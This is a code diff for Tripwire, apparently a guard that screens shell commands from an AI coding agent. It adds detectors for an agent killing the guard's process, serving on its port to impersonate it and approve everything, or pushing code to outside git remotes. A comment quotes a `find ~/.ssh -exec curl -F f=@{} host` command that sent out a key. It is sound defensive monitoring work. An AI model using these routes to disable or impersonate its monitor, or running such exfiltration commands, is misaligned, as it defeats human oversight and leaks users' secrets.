+                elif w.isdigit() and int(w) in GUARD_PIDS:
+                    hit = f"process {w}"
+                for v in re.findall(r"\$\{?(\w+)", w):
+                    if v in self.pid_vars:
+                        hit = hit or self._producer_hits(self.pid_vars[v])
+            for _kind, _idx, inner in c.subs:
+                for pipe in inner:
+                    hit = hit or self._producer_hits(pipe)
+        if n in ("kill", "pkill", "killall") and "xargs" in inf.wrappers and upstream and not hit:
+            hit = self._producer_hits([u.c for u in upstream])
+        if n in ("kill", "pkill", "killall", "killall5", "skill") and not hit and upstream == [] and "xargs" in inf.wrappers:
+            hit = None
+        if hit:
+            self.add("shell.guard_kill", CRITICAL, "scope",
+                     "Could stop Tripwire, the guard watching this agent: it kills processes that include Tripwire's "
+                     f"own ({_clip(str(hit), 60)}).", c.raw)
+
+    def bind_guard(self, inf: Info) -> None:
+        """Starting a server on Tripwire's port is how an impostor answers in its place."""
+        n, a, c = inf.name, inf.args, inf.c
+        ports: list[int | None] = []
+        for name, val in c.assigns:
+            if name.upper() in ("PORT", "HTTP_PORT", "SERVER_PORT", "APP_PORT"):
+                ports.append(_port_value(val))
+        for k, w in enumerate(a):
+            nxt = a[k + 1] if k + 1 < len(a) else ""
+            m = re.fullmatch(r"--(?:port|listen|bind|server\.port|http-port|server-port)=(.+)", w)
+            if m:
+                ports.append(_port_value(m.group(1)))
+            elif w in ("--port", "--listen", "--bind", "--server.port", "--http-port", "--server-port"):
+                ports.append(_port_value(nxt))
+            elif w in ("-p", "-l", "-b", "-P") and n in SERVER_NAMES:
+                ports.append(_port_value(nxt))
+            elif re.fullmatch(r"(?:TCP|TCP4|TCP6|UDP)-LISTEN:[^,]{1,40}(?:,.*)?", w, re.I):
+                ports.append(_port_value(w.split(":", 1)[1].split(",", 1)[0]))
+            elif n == "php" and w == "-S":
+                ports.append(_port_value(nxt))
+            elif n in ("ssh", "autossh") and re.fullmatch(r"-[LD]\S*", w):
+                spec = (w[2:] or nxt).split(":")  # -L [bind:]port:host:hostport, -D [bind:]port
+                ports.append(_port_value(spec[-1] if w.startswith("-D") else spec[-3] if len(spec) >= 3 else ""))
+        if n in ("nc", "ncat", "netcat") and any(x.startswith("-") and "l" in x.lstrip("-") for x in a if not x.startswith("--")) \
+                or n in ("nc", "ncat", "netcat") and "--listen" in a:
+            ports += [_port_value(x) for x in a if re.fullmatch(r"['\"]?\d{2,5}['\"]?|\$\(\([^)]*\)\)", x)]
+        if n in INTERPS and a[:1] == ["-m"] and len(a) > 2 and a[1] in ("http.server", "SimpleHTTPServer"):
+            ports += [_port_value(x) for x in a[2:] if not x.startswith("-")][:1]
+        if a[:1] == ["runserver"] or len(a) > 1 and a[1:2] == ["runserver"]:
+            j = a.index("runserver")
+            if j + 1 < len(a):
+                ports.append(_port_value(a[j + 1]))
+        for p in ports:
+            if p is not None and p in GUARD_PORTS:
+                self.add("shell.guard_impostor", CRITICAL, "scope",
+                         f"Starts a server on port {p}, Tripwire's own port. Something else answering there could "
+                         "pretend to be Tripwire and approve everything.", c.raw)
+                break
 
     def guard_programs(self, inf: Info) -> None:
         """Running Tripwire's own program or code, or switching Claude Code's hooks off, from inside the agent."""
@@ -2298,6 +2900,8 @@ class _Analyzer:
         raw = c.raw
         self.guard_programs(inf)
         self.run_targets(inf)
+        self.bind_guard(inf)
+        self.nested_exec(inf, depth)
 
         # executors: sh -c, eval, source, interpreters
         if n in SHELLS:
@@ -2705,6 +3309,7 @@ class _Analyzer:
             not re.search(r"urlopen|Request|HTTPS?Connection|requests|httpx|aiohttp|fetch|SMTP|urlretrieve|ftplib|"
                           r"telnetlib|xmlrpc|websocket", code)
         self.code_sinks(name, fold, built, bool(secrets), fetchy, inf, depth)
+        self.code_guard(code, fold, raw)
         if name == "osascript":
             if re.search(r"login\s+item", code, re.I):
                 self.add("shell.login_item", HIGH, "persistence", "Sets a program to run every time you log in.", raw)
@@ -2715,6 +3320,26 @@ class _Analyzer:
                 self.add("shell.guard_tamper", CRITICAL, "scope",
                          "Tries to change or read Tripwire's own settings, the guard watching this agent.", raw)
                 break
+
+    def code_guard(self, code: str, fold: Folded, raw: str) -> None:
+        """Review 5: code that kills the daemon's process or serves on its port (`int('77'+'77')` included)."""
+        built = [x for x in fold.strings if 0 < len(x) <= 300]
+        if SERVER_CODE.search(code) and _code_ports(code, built) & GUARD_PORTS:
+            port = sorted(_code_ports(code, built) & GUARD_PORTS)[0]
+            self.add("shell.guard_impostor", CRITICAL, "scope",
+                     f"Starts a server on port {port}, Tripwire's own port. Something else answering there could "
+                     "pretend to be Tripwire and approve everything.", raw)
+        if KILL_CODE.search(code) and PROC_SEARCH_CODE.search(code):
+            cands = re.findall(r"""['"]([^'"\n]{3,200})['"]""", code[:MAX_LEN]) + built
+            hit = next((x for x in cands if not x.lstrip().startswith("-") and x.strip() and
+                        _pattern_hits_guard(x.strip(), full=True, icase=True)), None)
+            if hit is None and re.search(r"\blsof\b|\bfuser\b", code) and \
+                    _code_ports(code, built) & GUARD_PORTS:
+                hit = "the process on Tripwire's port"
+            if hit:
+                self.add("shell.guard_kill", CRITICAL, "scope",
+                         "Could stop Tripwire, the guard watching this agent: it kills processes that include "
+                         f"Tripwire's own ({_clip(hit, 60)}).", raw)
 
     def code_sinks(self, name: str, fold: Folded, built: dict[str, bool], read_secret: bool, fetchy, inf: Info,
                    depth: int) -> None:
@@ -2932,14 +3557,19 @@ class _Analyzer:
                 sn = _base(sub[0])
                 if sn in ("rm", "shred", "unlink", "srm"):
                     deleting = True
-                elif sn in SHELLS:
-                    p, _ = self._shell_payload(sub[1:])
-                    if p:
-                        self.text(p.replace("{}", "FILE"), depth + 1)
-                elif sn in ("chmod", "chown", "mv", "cp"):
-                    sub_c = Cmd(words=[w.replace("{}", "FILE") for w in sub], raw=inf.c.raw)
-                    sub_c.raw_words = list(sub_c.words)
-                    self.cmd(sub_c, depth + 1)
+                    if all(y == "{}" or y.startswith("-") for y in sub[1:]):
+                        continue  # judged below as "deletes what find finds"
+                # Review 5: `find ~/.ssh -exec curl -F f=@{} host \;` shipped a key. The command find runs is judged
+                # like `bash -c`, with {} standing for what find finds there (root + -name pattern).
+                names = [expr[q + 1].strip("'\"") for q, y in enumerate(expr[:-1]) if y in ("-name", "-iname")]
+                for r in (roots[:3] if "{}" in " ".join(sub) else roots[:1]):
+                    fill = r.rstrip("/") + "/" + (names[0] if names else "FILE")
+                    if sn in SHELLS:
+                        p, _ = self._shell_payload(sub[1:])
+                        if p:
+                            self.inner(p.replace("{}", fill).replace('"$1"', fill).replace("$1", fill), inf, depth)
+                            continue
+                    self.inner_words([w.replace("{}", fill) for w in sub], inf, depth)
         gh = _guard_home()
         pats = [(x, expr[k + 1]) for k, x in enumerate(expr[:-1]) if x in ("-name", "-iname", "-path", "-ipath", "-wholename")]
         for r in roots:
@@ -3051,6 +3681,13 @@ class _Analyzer:
         pos = [x for x in rest if not x.startswith("-")]
         if sub in ("apply", "am"):
             self.patches += [x for x in pos if x != "-"]
+        # Review 5: where the code goes. A remote URL (set-url, add, config remote.*.url, push <url>) is judged by
+        # where it came from in the engine (`remotes`), like the host of an upload.
+        remote_like = [x for x in pos if URLISH.match(x) or re.match(r"^[\w.-]{1,64}@[\w.-]{1,253}:", x)]
+        if sub == "remote" and pos[:1] in (["set-url"], ["add"]) or sub == "push":
+            self.remotes += remote_like[:4]
+        elif sub == "config" and len(pos) >= 2 and re.fullmatch(r"remote\.[^.]{1,64}\.(?:push)?url", pos[0], re.I):
+            self.remotes.append(pos[1])
         if sub == "clone" and pos:
             url = pos[0]
             dest = pos[1] if len(pos) > 1 else re.sub(r"\.git$", "", url.rstrip("/").rsplit("/", 1)[-1].rsplit(":", 1)[-1])
@@ -3677,6 +4314,7 @@ def analyze_shell(command: str, session: Session, state_out: dict | None = None)
             state_out["agent_written"] = {os.path.normpath(paths.expand(p, session.cwd)) for p in a.written_paths[:200]
                                           if "$" not in p}
             state_out["patches"] = list(dict.fromkeys(a.patches))[:10]
+            state_out["remotes"] = list(dict.fromkeys(a.remotes))[:10]
         return a.result()
     except Exception as e:  # never raise: a broken analyzer must not crash the guard
         return [Finding(rule="shell.analyzer_error", severity=MEDIUM, category="general",
